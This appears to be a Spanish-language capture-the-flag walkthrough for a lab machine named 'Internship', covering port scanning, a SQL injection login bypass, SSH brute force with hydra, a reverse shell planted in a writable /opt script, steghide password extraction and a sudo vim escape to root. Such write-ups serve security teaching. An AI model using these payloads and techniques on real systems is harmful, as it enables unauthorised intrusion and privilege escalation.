---
description: '✍️ Autor: s1egfr1ed🔍 Dificultad: Fácil 📅 Fecha de creación: 13/02/2025'
---

# Internship

### 🔍 RECONOCIMIENTO

En primer lugar, tras conectarnos a la máquina, utilizamos el comando:

```bash
ping -c 1 172.17.0.2
```

para verificar la conectividad de red.

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

A continuación, realizamos el comando:

```bash
nmap -sVC -p- -n --min-rate 5000 172.17.0.2
```

para realizar un escaneo de puertos y servicios detallado en la dirección IP.

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Como podemos observar durante el escaneo que el **puerto 22** perteneciente al **servicio SSH** y el **puerto 80** perteneciente al **servicio HTTP** están abiertos por lo que a continuación se indagará más.&#x20;

### 🔎 **EXPLORACIÓN**

Se utiliza el comando:

```bash
sudo nmap -sCV -p22,80 -v 172.17.0.2
```

para obtener más información sobre esos puertos específicamente.

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Revisamos el puerto 80.

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Viendo el código fuente encontramos un dominio por lo que lo añadimos al `/etc/hosts`.

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-02-26 193843.png" alt=""><figcaption></figcaption></figure>

Recargamos la página y pulsamos a Iniciar Sesión. Al ser un panel de Login realizamos el típico bypass para probar.

```
' or 1=1 -- -
' or 1=1 -- -
```

<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Vemos que hay unos usuarios por lo que ponemos los nombres en un archivo para realizar fuerza bruta. Nos falta la contraseña por lo que seguimos indagando por lo que escaneamos los directorios.

```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
```

<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Nos llama la atención de un directorio llamado `/spam`. A primera vista nos sale vacío pero revisamos el código fuente.

<figure><img src="../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Parece que contiene información relevante pero esta en ROT13.

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-02-26 195359.png" alt=""><figcaption></figcaption></figure>

### 🚀 **EXPLOTACIÓN**

Ahora sí tras descubrir la contraseña hacemos fuerza bruta.

```
hydra -L usuarios -p purpl3 -I ssh://172.17.0.2 
```

<figure><img src="../../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Iniciamos sesión con las credenciales.

```bash
ssh pedro@172.17.0.2
```

<figure><img src="../../.gitbook/assets/image (8) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### 🔐 **PRIVILEGIOS**

Al estar dentro y ejecutar:

```bash
whoami
```

aún no somos **root**, por lo que hacemos:

```bash
sudo -l
```

para ver si hay algo para explotar. No tenemos permisos **SUDO**.

Dentro del directorio `/opt`, encontramos el script `log_cleaner.sh`, el cual pertenece al usuario `valentina` y tiene permisos de lectura, escritura y ejecución para su propietario, así como permisos de lectura y escritura para otros usuarios.

```bash
#!/bin/bash
bash -i >& /dev/tcp/172.17.0.1/445 0>&1
```

Nos ponemos en escucha.

```
nc -nlvp 445
```

<figure><img src="../../.gitbook/assets/image (9) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Vemos que hay una imagen por lo que nos la traemos a nuestra máquina para realizar la técnica de esteganografía.

```bash
mv profile_picture.jpeg /tmp
chmod 0777 /tmp/profile_picture.jpeg
```

En nuestra máquina local.

```bash
scp pedro@172.17.0.2:/tmp/profile_picture.jpeg .
```

<figure><img src="../../.gitbook/assets/image (10) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Usamos la herramienta de **Steghide**.

```
steghide extract -sf profile_picture.jpeg
```

Miramos el contenido del archivo.

<figure><img src="../../.gitbook/assets/image (11) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Será la contraseña de valentina.

<figure><img src="../../.gitbook/assets/image (12) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

{% embed url="https://gtfobins.github.io/gtfobins/vim/#sudo" %}

```bash
sudo vim -c ':!/bin/sh'
```

<figure><img src="../../.gitbook/assets/image (13) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
